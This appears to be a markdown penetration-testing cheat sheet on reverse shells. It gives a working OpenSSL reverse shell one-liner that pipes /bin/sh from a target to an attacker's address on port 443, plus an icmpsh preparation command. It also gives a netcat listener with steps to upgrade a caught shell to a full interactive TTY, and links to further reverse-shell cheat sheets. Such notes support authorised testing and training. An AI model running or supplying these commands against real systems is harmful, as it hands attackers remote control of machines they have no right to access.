# OpenSSL Reverse Shell
[Generate OpenSSL Certificate](../../SSL/OpenSSL/README.md#Generate-SSL-Certificate)
[Start OpenSSL Listener](../../SSL/OpenSSL/README.md#Start-OpenSSL-Listener)
##### From Target, create named pipe and OpenSSL client to connect to Attack Machine.
```bash
# On Target
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <Attack IP ADdress>:443 > /tmp/x; rm /tmp/x
```

# ICMP Reverse Shell with icmpsh
##### Disable ICMP replies by the OS
```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
## ICMP Reverse Shell References
[Github icmpsh](https://github.com/bdamele/icmpsh)

[Pentestlab Blog](https://pentestlab.blog/tag/icmpsh/)

[Security Online](https://securityonline.info/icmpsh-simple-reverse-icmp-shell/)

# [Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell/)
##### Note: The methods above will not work in every situation. For example, I have regularly run into a problem on my Kali machine where attempting to use stty raw -echo while using zsh as my shell will cause the entire terminal to become unusable. I have gotten around this issue by switching to bash before I start any netcat listener that I will be using to catch a shell.
```bash
bash
rlwrap nc -lvnp $port
which python python2 python3
/usr/bin/python3 -c "import pty; pty.spawn('/bin/bash')"; #spawn a python psuedo-shell
CTRL+Z # to background shell
stty raw -echo # Send control characters to the shell.
stty size # Get terminal window size 48 / 102
fg # foreground shell
export SHELL=bash
stty rows $x columns $y #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

# Cheatsheets
[HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

# References
[Staged vs Stageless Handlers](https://buffered.io/posts/staged-vs-stageless-handlers/)

[Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell/)